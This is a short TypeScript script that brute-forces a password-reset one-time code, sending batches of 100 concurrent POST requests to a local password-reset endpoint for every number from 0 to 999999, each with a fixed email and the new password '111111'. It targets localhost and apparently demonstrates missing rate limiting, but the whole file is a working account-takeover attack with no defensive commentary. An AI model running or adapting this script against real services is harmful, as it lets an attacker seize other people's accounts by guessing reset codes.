import axios from "axios";
async function hit(otp:string){
    let data = JSON.stringify({
        "email": "ash@gmail.com",
        "otp": otp,
        "newPassword": "111111"
      });
      
      let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'http://localhost:3000/password-reset',
        headers: { 
          'Content-Type': 'application/json'
        },
        data : data
      };
      try{
          await axios.request(config);
          console.log("done for " + otp);
      }
      catch(e){
      
      }
}

async function main(){
    
    for(let i=0;i<=999999;i+=100){
      const p = []
        console.log(i);
        //Let's apply batching...
        for(let j=0;j<100;j++){
            p.push(hit((i + j).toString()))
        }
        await Promise.all(p);
    }
    
}

main();
